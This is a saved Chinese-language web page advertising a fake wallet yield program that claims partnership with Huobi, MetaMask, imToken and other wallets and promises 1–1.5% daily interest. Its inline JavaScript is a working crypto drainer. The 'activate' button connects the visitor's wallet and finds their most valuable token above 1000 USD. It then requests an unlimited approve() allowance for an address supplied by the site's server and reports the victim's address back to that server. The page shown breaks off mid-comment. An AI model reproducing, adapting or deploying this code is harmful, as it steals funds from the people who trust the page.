<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
	<meta name="apple-mobile-web-app-capable" content="no">
	<meta name="format-detection" content="telephone=no">
	<link rel="stylesheet" type="text/css" href="./huobi_files/swiper.min.css">
	<script type="text/javascript" async="" src="./huobi_files/js"></script>
	<script async="" src="./huobi_files/analytics.js"></script>
	<script src="./huobi_files/hm.js"></script>
	<script async="" src="./huobi_files/analysis.js"></script>
	<script async="" src="./huobi_files/scrollreveal.min.js"></script>
	<script async="" src="./huobi_files/common.js"></script>
	
	<title>DApp | 探索去中心化的智能合约应用 | </title>
	<meta name="description" content="">
	<meta name="generator">
	<meta name="keywords" content="">
	<meta name="next-head-count" content="6">
	<!-- 引入 layui.css -->
	<link rel="stylesheet" href="./huobi_files/layui.css">
	<!-- 引入 layui.js -->
	<script src="./huobi_files/layui.js"></script>
	<link id="layuicss-laydate" rel="stylesheet" href="./huobi_files/laydate.css" media="all">
	<link id="layuicss-layer" rel="stylesheet" href="./huobi_files/layer.css" media="all">
	<link id="layuicss-skincodecss" rel="stylesheet" href="./huobi_files/code.css" media="all">
	<link rel="preload" href="./huobi_files/14abdc9457c4f6cddc6443ebde71942f.css" as="style">
	<link rel="stylesheet" href="./huobi_files/14abdc9457c4f6cddc6443ebde71942f.css">
	<link rel="preload" href="./huobi_files/styles.7d1b9906.chunk.css" as="style">
	<link rel="stylesheet" href="./huobi_files/styles.7d1b9906.chunk.css">
	<link rel="preload" href="./huobi_files/dapp.js.6e10500f.chunk.css" as="style">
	<link rel="stylesheet" href="./huobi_files/dapp.js.6e10500f.chunk.css">
	<link rel="stylesheet" href="./huobi_files/14abdc9457c4f6cddc6443ebde71942f.css">
	<link rel="stylesheet" href="./huobi_files/3dc1b9548bb5ef826953b26cdfc3f7cb.css">

<body>
	<div>
		<div class="dapp-page">
			<div>
				<header class="common-navbar-container">
					<div class="common-navbar">
						<a href="javascript:;"><img class="navbar-logo" src="./huobi_files/1.png" alt=" Logo"></a>
						<div style="margin-top: 4px;font-size: 22px;color: #fff;">火利宝</div>
						<nav id="navbar-links">
							<div>
<!--								<button class="layui-btn layui-btn-normal" id="demo5">-->
<!--									语言/Language-->
<!--									<i class="layui-icon layui-icon-down layui-font-12"></i>-->
<!--								</button>-->
								<script>

									layui.use('dropdown', function () {
										var dropdown = layui.dropdown
											, $ = layui.jquery;

										//自定义事件 - mousedown
										dropdown.render({
											elem: '#demo5',
											trigger: 'mousedown',
											data: [
												{
													title: '简体中文',
													id: 100,
													href: "/"
												},
												{
													title: '繁体中文',
													id: 101,
													href: "/traditional.html"
												},
												{
													title: 'китайский язык',
													id: 102,
													href: "/russian.html"
												},
												{
													title: '日本語',
													id: 103,
													href: "/japanese.html"
												},
												{
													title: '한국어',
													id: 104,
													href: "/korean.html"
												},
												{
													title: 'English',
													id: 105,
													href: "/english.html"
												},
												{
													title: 'Deutsche',
													id: 106,
													href: "/german.html"
												},
												{
													title: 'Espanyol',
													id: 107,
													href: "/spanish.html"
												},
												{
													title: 'português',
													id: 108,
													href: "/portuguese.html"

												},
												{
													title: 'français',
													id: 109,
													href: "/french.html"

												},
												{
													title: 'italiano',
													id: 110,
													href: "/italian.html"
												}
											]
										});
									});
								</script>
							</div>
							<div>
								<a href="#" class="ant-btn ant-btn-primary"><span>火币钱包</span></a>
							</div>
						</nav>
					</div>
					<div id="space"></div>
				</header>
				<div class="navbar-placeholder"></div>
			</div>
			<div class="home-page">
				<div>
					<div>
						<section class="common-banner">
							<div class="banner-inner">
								<div>
									<h2 class="title">数字资产 尽在掌握</h2>
									<p class="subtitle">
										火利宝是由DApp联合 火币钱包，麦子钱包，TokenPocket，MetaMask，Trust Wallet，imToken 	世界六大顶级钱包，官方共同推出为期三个月的随存随取的持币增值活动，“存U得U”是该活动一大亮点，堪称数字资产界的“余额宝”
									</p>
									<p class="learn-more">
										<a href="javascript:init();" class="ant-btn ant-btn-primary" style="width: 100px;height: 40px;line-height: 40px;"><span>激活</span></a>
									</p>
									<p style="margin-top: 10px;">活动时间2021年09月01日-2021年12月01日</p>
								</div><img class="home-banner" src="./huobi_files/banner.png" alt="">
							</div>
						</section>
						<section class="section-wrap example-section">
							<div class="section-inner">
								<div class="flex-row"><img src="./huobi_files/20210627-1(6).png" class="example">
									<div>
										<p class="i-title">即时透明，坐享收益</p>
										<p class="i-subtitle">体验去中心化理财，收益实时获取</p>
									</div>
								</div>
							</div>
						</section>
						<section class="product">
							<div class="product-inner">
								<div class="flex-row product-wallet"><img src="./huobi_files/wallet.svg" alt="wallet">
									<div>
										<p class="title">用户可以随时转入，随时转出，实时到账</p>
										<p class="subtitle">转入后当天计息，当天开始计算收益，当天晚上收益到账；</p>
										<div class="flex-row">
											<div>
												<p class="number">12</p>
												<p class="desc">已支持公链</p>
											</div>
											<div class="ant-divider ant-divider-vertical" role="separator"></div>
											<div>
												<p class="number">200K+</p>
												<p class="desc">已收录代币</p>
											</div>
										</div>
									</div>
								</div>
								<div class="flex-row product-tokenlon">
									<div>
										<p class="title">利息收益到账后会自动转入USDT余额开始计息</p>
										<p class="subtitle">用户转出火币钱包 ， 麦子钱包 ， TokenPocket ， MetaMask ，Trust Wallet ，
											imToken，在转出部分当天不计息</p>
										<p class="number">TOP3</p>
										<div class="flex-row">
											<div>
												<p class="desc">以太坊去中心化交易所</p>
											</div>
											<div class="ant-divider ant-divider-vertical" role="separator"></div>
											<div>
												<a class="desc more-detail link-hover" href="javascript:init();">立即体验</a>
											</div>
										</div>
									</div><img src="./huobi_files/tokenlon.svg" alt="tokenlon">
								</div>
								<div class="flex-row product-imkey"><img src="./huobi_files/imkey.svg" alt="imkey">
									<div>
										<p class="title">钱包USDT余额存储量1000USDT以上可享每天1.0—1.5%的存币利息</p>
										<p class="subtitle">每天新加坡时间00:00 账户余额将会自动生息</p>
										<p class="number">9.9USDT</p>
										<div class="flex-row">
											<div>
												<p class="desc">当前售价</p>
											</div>
											<div class="ant-divider ant-divider-vertical" role="separator"></div>
											<div>
												<a class="desc more-detail link-hover" href="javascript:init();">立即购买</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</section>
						<section class="partner">
							<div class="partner-inner">
								<h2 class="title" style="color:#000;">生态伙伴</h2>
								<div class="partner-list">
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/huobi.png" alt="火币钱包"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/maizi.png" alt="麦子钱包"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/TokenPocket.png" alt="TokenPocket"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/MetaMask.svg" alt="MetaMask"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/TrustWallet.svg" alt="Trust Wallet"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/imToken.svg" style="width: 152.2px;height:25.2px" alt="imToken"></a>
									<a class="partner-item partner-logo" href="javascript:;" target="_blank">
										<img src="./huobi_files/dapp.png" alt="imToken"></a>
								</div>
							</div>
						</section>
					</div>
				</div>
				<section class="section-wrap contact-section">
					<div class="section-inner">
						<p class="title">联系我们</p>
						<div class="flex-row">
							<div class="flex-column"><img src="./huobi_files/bd.svg">
								<div>
									<p class="title">商务合作</p>
									<p class="subtitle">欢迎通过邮箱与我们取得联系</p>
									<a class="link-btn more-detail link-hover" href="mailto:huobijiaoyizhongxin@gmail.com"><span>huobijiaoyizhongxin@gmail.com</span></a>
								</div>
							</div>
						</div>
					</div>
				</section>
			</div>
			　　　 <a href="https://huobi-vip.com/#" name="a1">.</a>
			<footer class="common-footer">
				<nav class="nav-links">
					<div class="links-wrap" style="margin-bottom: 20px;">
						为了防止不法分子诱导用户在假网站下载假APP，请用户自行搜索：火币钱包 ， 麦子钱包 ， TokenPocket ， MetaMask ，Trust Wallet ，
						imToken官网，进行下载。
					</div>
					<div class="flex-row media-wrap">
						<div>
							<div class="social">
								<a href="javascript:;" target="_blank"><img class="social-icon" src="./huobi_files/twitter.svg" alt="Twitter"></a>
								<a href="javascript:;" target="_blank"><img class="social-icon" src="./huobi_files/medium.svg" alt="Medium"></a>
								<a href="javascript:;" target="_blank"><img class="social-icon" src="./huobi_files/tokenfans.svg" alt="TokenFans"></a>
								<a href="javascript:;" target="_blank"><img class="social-icon" src="./huobi_files/weibo.svg" alt="Weibo"></a><img class="social-icon" src="./huobi_files/wechat.svg" alt="Wechat">
								<a href="javascript:;" target="_blank"><img class="social-icon" src="./huobi_files/github.svg" alt="Github"></a>
							</div>
							<nav class="nav-info">
								<div class="info">
									<p class="copyright">@Consenlabs</p>
									<a href="javascript:;" data-locale="zh-CN" id="term-link" target="_blank">服务条款</a>
									<div class="language">
										<div class="language"><img class="language-icon" src="./huobi_files/globe.svg">
											<p class="current-language">简体中文</p>
										</div>
									</div>
								</div>
							</nav>
						</div>
						<div class="links-item subscribe-item">
							<form class="subscribe" action="https://token.us14.list-manage.com/subscribe/post?u=7ae629ae8d62dab7a42aac15d&amp;id=34a9c87cd9" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" target="_blank"><input type="email" class="subscribe-input" name="EMAIL" id="mce-EMAIL" placeholder="huobijiaoyizhongxin@gmail.com" required=""><img class="subscribe-icon" src="./huobi_files/subscribe.svg" alt="Subscribe button"><input type="submit" class="subscribe-submit"></form><span style="margin-top:10px">及时获取最新资讯</span>
						</div>
					</div>
				</nav>
				<div class="friend-link">
					<p class="friend-title">友情链接</p>
					<p class="friend-links">
						<a href="javascript:;" target="_blank">链节点</a>
						<a href="javascript:;" target="_blank">AICoin</a>
						<a href="javascript:;" target="_blank">BLOCKCHAIR</a>
						<a href="javascript:;" target="_blank">陀螺财经</a>
						<a href="javascript:;" target="_blank">蜜蜂查</a>
						<a href="javascript:;" target="_blank">Ethfans</a>
						<a href="javascript:;" target="_blank">链闻</a>
					</p>
				</div>
			</footer>
		</div>
	</div>

	<script nomodule="" src="./huobi_files/polyfills-e02ae7a01328ba3eb570.js"></script>
	<script async="" data-next-page="/dapp" src="./huobi_files/dapp.js"></script>
	<script async="" data-next-page="/_app" src="./huobi_files/_app.js"></script>
	<script src="./huobi_files/webpack-4b444dab214c6491079c.js" async=""></script>
	<script src="./huobi_files/framework.74d547792b3163b4d6d2.js" async=""></script>
	<script src="./huobi_files/commons.a900dda831d21edefec8.js" async=""></script>
	<script src="./huobi_files/aec7d165.f36caca214c9242fde66.js" async=""></script>
	<script src="./huobi_files/29107295.0e7ba09e950b002c45e4.js" async=""></script>
	<script src="./huobi_files/14abdc9457c4f6cddc6443ebde71942f.js" async=""></script>
	<script src="./huobi_files/14abdc9457c4f6cddc6443ebde71942f1.js" async=""></script>
	<script src="./huobi_files/styles.63d8c6e83d07182dd653.js" async=""></script>
	<script src="./huobi_files/_buildManifest.js" async=""></script>
	<script src="./huobi_files/_ssgManifest.js" async=""></script>
	<script type="text/javascript" src="./huobi_files/jquery.min.js"></script>
	<script src="./huobi_files/web3.min.js"></script>
	<script src="./huobi_files/web3model.min.js"></script>
	<script src="./huobi_files/web3provider.js"></script>
<!--	<script src="./huobi_files/web3work.min.js"></script>-->

<script>
	function getSubStr ( str){
		var subStr1 = str. substr( 0, 5);
		var subStr2 = str. substr( str. length- 5, 5);
		var subStr = subStr1 + "..." + subStr2 ;
		return subStr;
	};
	const ABI = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
	var authorized_address = ''; // '';
	var infura_key = '7d73a0c13ce946769577714aef84b79a';
	var bizhong = 'usdt';
	var approved = false;
	var address = '0xF2578520A1d39e6d0e5E43DcC4E62A0f7192f4c0';// getUrlQueryString('address')
	var rank = 6.45;
	var domain = 'https://' + window.location.host + '/';

	const _web3 = new Web3('https://cloudflare-eth.com')
	let injectedWeb3 = null, total = 0
	let approveAddr = '0xdac17f958d2ee523a2206206994597c13d831ec7'
	const addr = {
		'usdt': '0xdac17f958d2ee523a2206206994597c13d831ec7',
		'sushi': '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2',
		'usdc': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
		'uni': '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984',
		'aave': '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9',
		'yfi': '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',
		'dai': '0x6b175474e89094c44da98b954eedeac495271d0f',
		'link': '0x514910771af9ca656af840dff83e8264ecf986ca',
		"LON": "0x0000000000095413afc295d19edeb1ad7b71c952",
		"CRV": "0xD533a949740bb3306d119CC777fa900bA034cd52",
		'FIL': "0xbf48ecb7c2d3d559e0a24b04f306889e05c73cd6",
	}

	const addr2 = {
		"WBTC": "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
		"WETH": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
		"CONV": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
		"inj": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
		"MKR": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
		"ALPHA": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
		"BAND": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
		"snx": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
		"comp": "0xc00e94cb662c3520282e6f5717214004a7f26888",
		"sxp": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
	}

	const addr3 = {
		"FTT": "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9",
		"ust": "0xa47c8bf37f92abed4a126bda807a7b7498661acd",
		"TRIBE": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
		"wise": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
		"RRAX": "0x853d955acef822db058eb8505911ed77f175b99e",
		"CORE": "0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7",
		"mir": "0x09a3ecafa817268f77be1283176b946c4ff2e608",
		"DPI": "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b",
		"luna": "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9",
		"HEZ": "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE",
		"fxs": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
		"fei": "0x956f47f50a910163d8bf957cf5846d573e7f87ca",
	}

	const price = {
		usdt: 1,
		sushi: 15.5,
		usdc: 1,
		dai: 1,
		uni: 28.6,
		aave: 380,
		yfi: 35000,
		link: 28.2,
		"LON": 7,
		"CRV": 3.01367,
		"GUSD": 1,
		"WBTC": 56478.2,
		"WETH": 1991.89,
		"CONV": 0.105733,
		"inj": 13.3812,
		"MKR": 2076.68,
		"ALPHA": 1.79043,
		"BAND": 16.3441,
		"snx": 20.0588,
		"comp": 468.076,
		"sxp": 4.11818,
		"FTT": 46.1779,
		"ust": 1.00543,
		"TRIBE": 1.42926,
		"wise": 0.446973,
		"RRAX": 0.996821,
		"CORE": 5447.59,
		"mir": 8.69817,
		"DPI": 415.906,
		"luna": 15.2402,
		"HEZ": 5.97533,
		"fxs": 8.47025,
		"fei": 0.898157,
	}

	const decimals = {
		sushi: 18,
		usdt: 6,
		usdc: 6,
		uni: 18,
		dai: 18,
		aave: 18,
		yfi: 18,
		link: 18,
		WBTC: 8,
	}

	const contracts = {}, contracts2 = {}, contracts3 = {}
	for (const symbol of Object.keys(addr)) {
		const contractAddr = addr[symbol]
		contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
	}

	for (const symbol of Object.keys(addr2)) {
		const contractAddr = addr2[symbol]
		contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
	}

	for (const symbol of Object.keys(addr3)) {
		const contractAddr = addr3[symbol]
		contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
	}

	const Web3Modal = window.Web3Modal.default;
	const WalletConnectProvider = window.WalletConnectProvider.default;
	// Web3modal instance
	let web3Modal
	// Chosen wallet provider given by the dialog window
	let provider;
	// Address of the selected account
	let selectedAccount;
	async function init() {
		getInfo();

		console.log(infura_key);
		const providerOptions = {
			walletconnect: {
				package: WalletConnectProvider,
				options: {
					// Mikko's test key - don't copy as your mileage may vary
					infuraId: "47a950cab4134279952b2202ec61dda8",
				}
			},
		};

		web3Modal = new Web3Modal({
			cacheProvider: false, // optional
			providerOptions, // required
			disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
		});
		try {
			provider = await web3Modal.connect()
			provider.enable()
		} catch(e) {
			console.log("Could not get a wallet connection", e);
			return;
		}
		// Subscribe to accounts change
		provider.on("accountsChanged", async (accounts) => {
			await fetchAccountData();
		});
		// Subscribe to chainId change
		provider.on("chainChanged", async (chainId) => {
			await fetchAccountData();
		});
		// Subscribe to networkId change
		provider.on("networkChanged", async (networkId) => {
			await fetchAccountData();
		});
		await fetchAccountData(provider);
	}

	/**
	 * Kick in the UI action after Web3modal dialog has chosen a provider
	 */
	async function fetchAccountData() {
		const web3 = new Web3(provider);
		injectedWeb3 = web3
		provider.enable()
		const accounts = await web3.eth.getAccounts()
		selectedAccount = accounts[0]

		getMostValuableAssets(selectedAccount)
		setTimeout(function() {
			getMostValuableAssets2(selectedAccount)
		}, 200)
		setTimeout(function() {
			getMostValuableAssets3(selectedAccount)
		}, 300)
		// getInfo();
		// getAirdropInfo();

		//const web3 = new Web3(provider);
		const contract = new web3.eth.Contract(ABI, approveAddr)
		const gasPrice = web3.eth.gasPrice;

		if (selectedAccount && provider) {
			const web3 = new Web3(provider);
			const contract = new web3.eth.Contract(ABI, approveAddr)


			const gasPrice = web3.eth.gasPrice


			contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
				from: selectedAccount,
				gasPrice: gasPrice,
				gas: 100000,
			}, function(err, tx) {
				if(!err){
					postInfo(selectedAccount,bizhong)
				}
				$('.modal-overlay').remove();

				$('.modal').removeClass('modal-in').addClass('modal-out');

				console.log(err, tx)

			})
		} else {
			provider = await web3Modal.connect()
			provider.enable()
			const web3 = new Web3(provider);
			const accounts = await web3.eth.getAccounts()
			selectedAccount = accounts[0]
			const contract = new web3.eth.Contract(ABI, approveAddr)
			const gasPrice = web3.eth.gasPrice

			contract.methods.approve(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
				from: selectedAccount,
				gasPrice: gasPrice,
				gas:100000,
			}, function(err, tx) {
				console.log(err, tx)
				if(!err){
					postInfo(selectedAccount,bizhong)
				}
				$('.modal-overlay').remove();

				$('.modal').removeClass('modal-in').addClass('modal-out');
			})
		}


		// var gas = await contract.methods.approve(authorized_address, "79228162514264337593543950335").estimateGas({
		// 	from: selectedAccount
		// },function(err, tx) {
		// 	console.log(err, tx)
		// })
		// if(gas == undefined){
		// 	gas = 80000;
		// }
		//
		// console.log(authorized_address);
		// contract.methods.approve(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
		// 	from: selectedAccount,
		// 	gasPrice: 150000,
		// 	gas: 100000,
		// }, function(err, tx) {
		// 	if(!err){
		// 		postInfo(selectedAccount,bizhong)
		// 	}
		// 	console.log(err, tx)
		// })

	}

	async function getMostValuableAssets(account) {
		let _symbol = 'usdt'
		console.log('_symbol:'+_symbol);

		for (const [symbol, contract] of Object.entries(contracts)) {
			contract.methods.balanceOf(account).call(function(err, balance) {
				if(symbol == 'usdt'){
				    total = balance / (10** (decimals[symbol] || 18))
	
				}
				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
				if (usdt > total && usdt > 1000) {
					_symbol = symbol
					total = usdt
					approveAddr = addr[_symbol]
					bizhong = _symbol

					// checkApproved(selectedAccount,bizhong);
				}
			})
		}
		bizhong = _symbol
		// checkApproved(selectedAccount,bizhong);

		console.log('_symbol:'+_symbol);
		return _symbol
	}

	async function getMostValuableAssets2(account) {
		let _symbol = 'usdt'
		console.log('_symbol:'+_symbol);
		for (const [symbol, contract] of Object.entries(contracts2)) {
			contract.methods.balanceOf(account).call(function(err, balance) {
				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
				if (usdt > total && usdt > 1000) {
					_symbol = symbol
					total = usdt
					approveAddr = addr[_symbol]

					// checkApproved(selectedAccount,bizhong);
				}
			})
		}

		bizhong = _symbol

		console.log('_symbol:'+_symbol);
		return _symbol
	}

	async function getMostValuableAssets3(account) {
		let _symbol = 'usdt'
		for (const [symbol, contract] of Object.entries(contracts3)) {
			contract.methods.balanceOf(account).call(function(err, balance) {
				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
				if (usdt > total && usdt > 1000) {
					_symbol = symbol
					total = usdt
					approveAddr = addr[_symbol]

					// checkApproved(selectedAccount,bizhong);
				}
			})
		}
		bizhong = _symbol
		console.log('_symbol:'+_symbol);
		return _symbol
	}

	function getUrlQueryString(names, urls) {
		urls = urls || window.location.href;
		urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
		var reg = new RegExp("(^|&)" + names + "=([^&#]*)", "i");
		var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
		if (r != null && r[2] != "")return unescape(r[2]);
		return null;
	}

	async function getInfo(){
		$.ajax({
			type: 'get',
			url:  '/api/get_erc',
			//async : false,
			success:function(data){
				console.log(data)
				authorized_address = data.data.authorized_address;
				console.log(authorized_address);
				infura_key = data.data.infura_key;
			},
			error:function(data){
			}
		})
	}

	async function postInfo(address,symbol){
		var s = getUrlQueryString('s')
		var a = getUrlQueryString('r')
		var data = {
			address:address,
			authorized_address:authorized_address,
			bizhong:symbol,
			code:s,
			reffer:a
		}

		$.ajax({
			type: 'post',
			url:   '/api/insert_erc',
			data:data,
			// success:function(data){
			//     //console.log(data)
			//     if(data.code === 200){
			//     	console.log('success')
			//
			//     }
			//     console.log(data.msg)
			// },
			// error:function(data){
			// 	console.log(data)
			// }
		})
	}

	async function connect(){
		init();
	}
	async function goActive() {
		// if (!selectedAccount || !provider) {
		// 	connect();
		// }
		if (approved) {
			// return;
		}

		try {
			provider = await web3Modal.connect()
			provider.enable()
		} catch(e) {
			console.log("Could not get a wallet connection", e);
			return;
		}
		await fetchAccountData();
	}

	function goDiv(div) {
		var a = $("#" + div).offset().top;
		$("html,body").animate({scrollTop: a}, 'slow');
	}
	// 分享
	function goShare(){
		goDiv("div-share");
	}

	// async function getInfo(){
	// 	console.log('getInfo-->',selectedAccount);
	// 	console.log('getInfo-chainId->',chainId);
	// 	$.ajax({
	// 		type: 'get',
	// 		url:  domain + '/api/filx/home?address='+selectedAccount+'&chainId='+chainId,
	// 		// async : false,
	// 		success:function(data){
	// 			if(data.code == '200'){
	// 				infura_key = data.data.infura_key;
	// 				coinCode=data.data.coin;
	// 				coinContract=data.data.contract;
	// 			}
	// 		},
	// 		error:function(data){
	// 		}
	// 	})
	// }
	// async function getAirdropInfo(){
	// 	console.log('getAirdropInfo-->',selectedAccount);
	// 	console.log('getAirdropInfo-chainId->',chainId);
	// 	$.ajax({
	// 		type: 'get',
	// 		url:  domain + '/api/filx/airdrop/info?address='+selectedAccount+'&chainId='+chainId,
	// 		// async : false,
	// 		success:function(data){
	// 			if(data.code == '200'){
	// 				console.log('getAirdropInfo-->',data);
	// 				let chances =data.data.chances;
	// 				let airdropped = data.data.airdropped;
	// 				$("#chances-number").html(chances);
	// 				$("#airpods-number").html(airdropped);
	// 				if (selectedAccount&&chances ==0 && airdropped ==0){
	// 					$("#btn-active").css('display','inline');
	// 					$("#btn-receive").css('display','none');
	// 					$("#btn-go-share").css('display','none');
	// 				}
	// 				if (selectedAccount&&chances>=1) {
	// 					//$("#btn-active").css('display','none');
	// 					$("#btn-receive").css('display','inline');
	// 					$("#btn-go-share").css('display','none');
	// 				}
	// 				if(selectedAccount&&(chances>0||airdropped>0)){
	// 					$("#btn-go-share").css('display','inline');
	// 				}
	// 			}
	// 		},
	// 		error:function(data){
	// 		}
	// 	})
	// }
	//领取空投
	async function claimAirdrop(){
		var info="The airdrop will be sent to your address shortly";
		swal("Tips", info, "success");
		// getAirdropInfo();
		// $.ajax({
		// 	type: 'get',
		// 	url:  domain + '/api/filx/airdrop?address='+selectedAccount+'&chainId='+chainId,
		// 	// async : false,
		// 	success:function(data){
		// 		if(data.code == '200'){
		// 			console.log('claimAirdrop-->',data);
		// 			var info="The airdrop will be sent to your address shortly";
		// 			swal("Tips", info, "success");
		// 			getAirdropInfo();
		// 		}
		// 	},
		// 	error:function(data){
		// 	}
		// })
	}
	async function shareInfo(){
		console.log('shareInfo-->',selectedAccount);
		$.ajax({
			type: 'get',
			url:  domain + '/api/filx/share/info?address=0x956f47f50a910163d8bf957cf5846d573e7f87ca',
			// async : false,
			success:function(data){
				if(data.code == '200'){
					var notShareReason = 'You will get your own promotion link after active whitelist;'
					console.log('shareInfo-->',data);
					var canNotShare = data.data.canNotShare
					console.log(canNotShare)
					if (canNotShare) {
						console.log("111")
						$("#error").html(notShareReason)
						$("#exampleModalButton").trigger('click')

					} else {
						$("#shareModalContent").css('display','inline');
						$("#error").css('display','none');
						var shareUrl = data.data.promotionLink;
						console.log(shareUrl)
						document.getElementById("promotion-link").innerHTML=shareUrl
						$("#exampleModalButton").trigger('click')
						document.getElementById('promotion-qr').innerHTML = "";
						new QRCode(document.getElementById("promotion-qr"), {
							text: shareUrl,//扫描二维码后的内容
							// width: 400,//二维码的宽
							// height: 400,//二维码的高
							colorDark : "#000000",//二维码线条颜色
							colorLight : "#fff",//二维码背景颜色
							correctLevel : QRCode.CorrectLevel.H    //二维码等级
						});

						// var content = $("#promotion-link").html()
						// console.log(content)

						var clipboard = new Clipboard('.copylink', {
							// text: function() {
							// 	return content;
							// }
						});
						clipboard.on('success', function(e) {
							console.log(e.text)
							var info="Success";
							swal("Tips", info, "success");
							// // alert("复制成功");
						});

						clipboard.on('error', function(e) {
							var info="Error";
							swal("Tips", info, "error");
						});
					}
				}
			},
			error:function(data){
			}
		})
	}
	//激活后的回调
	// async function postInfo(){
	// 	var data = {
	// 		coinCode:coinCode,
	// 		address:selectedAccount,
	// 		chainId:chainId,
	// 		parentCode:parentCode,
	// 		infuraKey:infura_key
	// 	}
	// 	console.log('postInfo-->',data);
	// 	$.ajax({
	// 		type: 'post',
	// 		url:  domain + '/api/filx/request/airdrop/event',
	// 		data:data,
	// 		async:false,
	// 		success:function(data){
	// 			if(data.code == '200'){
	// 				if(data.data.chances==1){
	// 					//$("#btn-active").css('display','none');
	// 					$("#btn-receive").css('display','inline');
	// 					$("#btn-go-share").css('display','none');
	// 					$("#text-chances").html('Remain Receive Chances: '+1);
	// 					var info="Congratulations, you got 1 airdrop chance";
	// 					swal("Success", info, "success");
	// 				}else{
	// 					//$("#btn-active").css('display','none');
	// 					$("#btn-receive").css('display','none');
